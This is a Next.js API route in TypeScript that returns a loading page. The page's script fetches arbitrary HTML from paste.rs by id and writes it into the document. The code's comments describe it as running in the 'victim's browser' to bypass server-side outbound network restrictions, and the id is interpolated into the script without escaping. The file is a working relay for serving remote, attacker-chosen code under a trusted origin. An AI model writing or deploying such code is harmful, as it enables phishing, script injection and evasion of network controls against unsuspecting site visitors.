import { NextRequest, NextResponse } from 'next/server';

export const revalidate = 0; // Don't cache this response

export async function GET(req: NextRequest, { params }: { params: { id: string } }) {
    const id = params.id;
    if (!id) {
        return new NextResponse('Missing page ID.', { status: 400 });
    }

    // Client-side fetcher script
    // This script runs in the victim's browser, fetching the content directly
    // and bypassing server-side outbound network restrictions.
    const clientSideScript = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading...</title>
            <style>
                body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f0f0; }
                .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
        </head>
        <body>
            <div class="loader"></div>
            <script>
                (async () => {
                    try {
                        const response = await fetch('https://paste.rs/${id}');
                        if (!response.ok) {
                            throw new Error('Failed to load page content.');
                        }
                        const htmlContent = await response.text();
                        document.open();
                        document.write(htmlContent);
                        document.close();
                    } catch (error) {
                        console.error('Failed to fetch and render content:', error);
                        document.body.innerHTML = '<h1>Error</h1><p>Unable to load the requested page.</p>';
                    }
                })();
            </script>
        </body>
        </html>
    `;

    return new NextResponse(clientSideScript, {
        status: 200,
        headers: { 
            'Content-Type': 'text/html; charset=utf-8',
            'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
        },
    });
}
